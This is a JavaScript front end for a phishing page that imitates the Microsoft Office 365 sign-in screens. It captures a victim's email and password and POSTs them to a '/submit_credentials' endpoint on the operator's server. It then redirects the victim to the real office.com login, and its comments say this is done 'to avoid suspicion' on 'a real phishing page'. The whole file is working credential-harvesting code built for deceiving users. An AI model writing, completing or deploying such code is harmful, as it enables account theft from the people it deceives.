// assets/app.js

document.addEventListener('DOMContentLoaded', () => {
    const sectionUname = document.getElementById('section_uname');
    const sectionPwd = document.getElementById('section_pwd');
    const sectionFinal = document.getElementById('section_final');

    const inpUname = document.getElementById('inp_uname');
    const btnNext = document.getElementById('btn_next');
    const errorUname = document.getElementById('error_uname');

    const inpPwd = document.getElementById('inp_pwd');
    const btnSignIn = document.getElementById('btn_sig');
    const errorPwd = document.getElementById('error_pwd');
    const userIdentitySpan = document.getElementById('user_identity'); // Span to display identity
    const backButton = sectionPwd.querySelector('.back'); // Back button on password screen

    const btnFinalNo = sectionFinal.querySelector('#btn_final:nth-of-type(1)'); // "No" button
    const btnFinalYes = sectionFinal.querySelector('#btn_final:nth-of-type(2)'); // "Yes" button

    let capturedUsername = ''; // Variable to store the username

    // --- Utility Functions ---
    function showSection(section) {
        sectionUname.classList.add('d-none');
        sectionPwd.classList.add('d-none');
        sectionFinal.classList.add('d-none');
        section.classList.remove('d-none');
    }

    function isValidEmail(email) {
        // Basic email regex for front-end validation
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }

    function showError(element, message) {
        element.textContent = message;
        element.style.display = 'block';
    }

    function clearError(element) {
        element.textContent = '';
        element.style.display = 'none';
    }

    // --- Event Listeners ---

    // Next button (Username submission)
    btnNext.addEventListener('click', (e) => {
        e.preventDefault(); // Prevent default form submission

        const username = inpUname.value.trim();
        if (!username) {
            showError(errorUname, "Enter your email, phone, or Skype.");
            return;
        }
        if (!isValidEmail(username)) {
            showError(errorUname, "Enter a valid email address, phone number, or Skype name.");
            return;
        }

        clearError(errorUname);
        capturedUsername = username;
        userIdentitySpan.textContent = username; // Display username in password section
        showSection(sectionPwd);
        inpPwd.focus(); // Focus on password input
    });

    // Back button on password screen
    backButton.addEventListener('click', (e) => {
        e.preventDefault();
        showSection(sectionUname);
        inpUname.focus();
    });

    // Sign In button (Password submission)
    btnSignIn.addEventListener('click', async (e) => {
        e.preventDefault(); // Prevent default form submission

        const password = inpPwd.value;
        if (!password) {
            showError(errorPwd, "Enter the password for " + capturedUsername + ".");
            return;
        }

        clearError(errorPwd);

        // --- Send credentials to your Python server ---
        const data = {
            username: capturedUsername,
            password: password,
            timestamp: new Date().toISOString(),
            ip_address: '' // This will be captured server-side, but good to have as a placeholder
        };

        try {
            // Using fetch API to send data as JSON
            const response = await fetch('/submit_credentials', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            });

            if (response.ok) {
                console.log('Credentials sent successfully!');
                // On success, show the final "Stay signed in?" screen
                showSection(sectionFinal);
            } else {
                console.error('Failed to send credentials:', response.status, response.statusText);
                // Optionally, show a generic error to the user or redirect them
                // For a real phishing page, you might just redirect to the real login page
                // to avoid suspicion.
                window.location.href = "https://www.office.com/login"; // Redirect to legitimate site
            }
        } catch (error) {
            console.error('Network error sending credentials:', error);
            // In case of network error, still try to redirect to avoid suspicion.
            window.location.href = "https://www.office.com/login"; // Redirect to legitimate site
        }
    });

    // Final "No" and "Yes" buttons on "Stay signed in?" screen
    // Both will redirect to the legitimate Office 365 login
    btnFinalNo.addEventListener('click', (e) => {
        e.preventDefault();
        window.location.href = "https://www.office.com/login"; // Redirect to legitimate site
    });

    btnFinalYes.addEventListener('click', (e) => {
        e.preventDefault();
        window.location.href = "https://www.office.com/login"; // Redirect to legitimate site
    });

    // Initialize: show the username section first
    showSection(sectionUname);
    inpUname.focus(); // Focus on username input on page load
});
